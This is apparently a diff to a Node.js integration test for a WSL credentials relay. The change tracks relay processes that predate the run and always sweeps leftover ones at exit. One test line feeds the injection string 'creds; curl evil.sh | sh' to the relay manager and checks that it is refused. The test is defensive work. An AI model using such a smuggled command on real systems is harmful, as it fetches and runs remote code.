@@ -21,6 +21,10 @@ const path = require('path');
 const { execFile } = require('child_process');
 
 const OUT = path.join(__dirname, '..', 'out');
+const { watchStrays } = require('./wslStrays.cjs');
+
+/** Set once WSL is known good; the sweep at the bottom checks for it. */
+let strays;
 const REPO = path.join(__dirname, '..', '..');
 const WINDOWS_CLI = path.join(REPO, 'src_cli', 'src', 'bin', 'Debug', 'net10.0', 'creds.exe');
 const LINUX_BUILD = '/tmp/creds-relay-itest-build';
@@ -123,6 +127,10 @@ async function main() {
   if (!(await buildLinuxCli())) {
     skip('the Linux CLI could not be built inside WSL');
   }
+  // Everything matching that is alive NOW belongs to somebody else — an earlier run, or a
+  // developer with the real thing open. This run is answerable for what it adds to that.
+  strays = watchStrays(wsl, '[c]reds relay', 'relay processes');
+  await strays.start();
 
   // ---- the agent, real, with a key generated here ----------------------------
   const { SshAgentServer } = require(path.join(OUT, 'sshAgentServer.js'));
@@ -307,25 +315,35 @@ async function main() {
     manager.socketPathFor(DEFAULT_DISTRO) === MANAGED_SOCKET,
     `${JSON.stringify(manager.socketPathFor(DEFAULT_DISTRO))} — log: ${JSON.stringify(managerLog)}`,
   );
-  const alive = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
-  check('a real relay is running in the distribution', alive.stdout.trim().length > 0, alive.stdout.trim());
+  // Both asked as a DIFFERENCE from what was alive before this run. Before, they were global
+  // `ps | grep` questions, so a relay some earlier run left behind made the second one fail — and
+  // would have made the first one pass without a relay of ours ever starting.
+  const alive = await strays.survivors();
+  check('a real relay is running in the distribution', alive.length > 0, `saw ${alive.length}`);
 
   manager.dispose();
   await new Promise((resolve) => setTimeout(resolve, 2000));
-  const gone = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
-  check('disposing the manager takes it down — nothing outlives the window', gone.stdout.trim().length === 0, gone.stdout.trim());
+  const gone = await strays.survivors();
+  check('disposing the manager takes it down — nothing outlives the window', gone.length === 0, strays.describe(gone));
 
   const refused = manager.start('creds; curl evil.sh | sh', ['']);
   check('a command that is not a plain word never reaches a shell', refused.ok === false, JSON.stringify(refused));
 
   await wsl(`rm -f ${RELAY_SOCKET} ${MANAGED_SOCKET} /tmp/creds-itest.*`);
   fs.rmSync(dir, { recursive: true, force: true });
-
-  console.log(failures === 0 ? '\nall WSL relay checks passed' : `\n${failures} check(s) failed`);
-  process.exit(failures === 0 ? 0 : 1);
 }
 
-main().catch((error) => {
-  console.error(error);
-  process.exit(1);
-});
+// The sweep runs whatever happened — see the note in `creds-mcp-wsl-itest.cjs`.
+main()
+  .catch((error) => {
+    console.error(error);
+    failures += 1;
+  })
+  .finally(async () => {
+    const swept = strays === undefined ? [] : await strays.sweep();
+    if (swept.length > 0) {
+      console.log(`swept ${swept.length} process(es) this run left behind`);
+    }
+    console.log(failures === 0 ? '\nall WSL relay checks passed' : `\n${failures} check(s) failed`);
+    process.exit(failures === 0 ? 0 : 1);
+  });
